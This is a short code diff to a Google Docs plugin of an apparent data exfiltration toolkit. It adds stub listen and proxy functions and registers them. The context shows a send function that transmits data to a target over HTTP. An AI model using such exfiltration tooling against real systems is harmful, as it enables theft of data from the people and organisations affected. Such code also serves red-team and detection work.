@@ -13,6 +13,11 @@ def send(data):
         'info', "[http] Sending {0} bytes to {1}".format(len(data), target))
     requests.get(target)
 
+def listen():
+    app_exfiltrate.log_message('info', "[Google docs] Listen mode not implemented")
+
+def proxy():
+    app_exfiltrate.log_message('info', "[proxy] [Google docs] proxy mode not implemented")
 
 class Plugin:
 
@@ -20,4 +25,4 @@ class Plugin:
         global app_exfiltrate, config
         config = conf
         app_exfiltrate = app
-        app.register_plugin('google_docs', {'send': send})
+        app.register_plugin('google_docs', {'send': send, 'listen': listen, 'proxy': proxy})
